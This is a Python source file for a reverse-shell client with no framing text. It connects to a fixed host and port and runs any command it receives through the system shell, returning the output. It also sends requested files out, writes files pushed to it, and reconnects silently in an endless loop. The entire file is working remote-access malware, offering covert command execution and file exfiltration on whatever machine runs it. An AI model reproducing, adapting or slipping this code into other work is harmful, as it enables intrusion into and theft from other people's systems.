import os
import socket
import subprocess

from psutil import cpu_percent


def all_func():
    SERVER_HOST = '192.168.1.124'
    SERVER_PORT = 5003
    BUFFER_SIZE = 4096
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))

    def download():
        full_path = s.recv(BUFFER_SIZE).decode()
        filesize = os.path.getsize(full_path)
        filesize_send = str(filesize)
        s.send(filesize_send.encode())
        with open(full_path, "rb") as f:
            for _ in range(filesize):
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
        s.send('^^^^^^^^^^^^^^^^^^^^^'.encode())

    def upload():
        full_path = s.recv(BUFFER_SIZE).decode()
        filename = os.path.basename(full_path)
        filesize = s.recv(BUFFER_SIZE).decode()
        filesize = int(filesize)
        with open(filename, 'wb') as f:
            for _ in range(filesize):
                bytes_read = s.recv(BUFFER_SIZE)
                if len(bytes_read) < BUFFER_SIZE:
                    f.write(bytes_read)
                    break
                f.write(bytes_read)
        s.send('^^^^^^^^^^^^^^^^^^^^^'.encode())

    def change_dir():
        full_path = s.recv(BUFFER_SIZE).decode()
        os.chdir(full_path)
        s.send('Executed.'.encode())

    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == 'exit':
            break
        elif command.lower() == 'cpu_percent':
            command = str(cpu_percent(interval=1))
        elif command.lower() == 'download':
            download()
        elif command.lower() == 'upload':
            upload()
        elif command.lower() == 'change dir':
            change_dir()
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
            if len(output) == 0:
                s.send('No command output.'.encode())
            else:
                # send the results back to the server
                s.send(output.encode())

    # close client connection
    s.close()


while True:
    try:
        all_func()
    except:
        continue
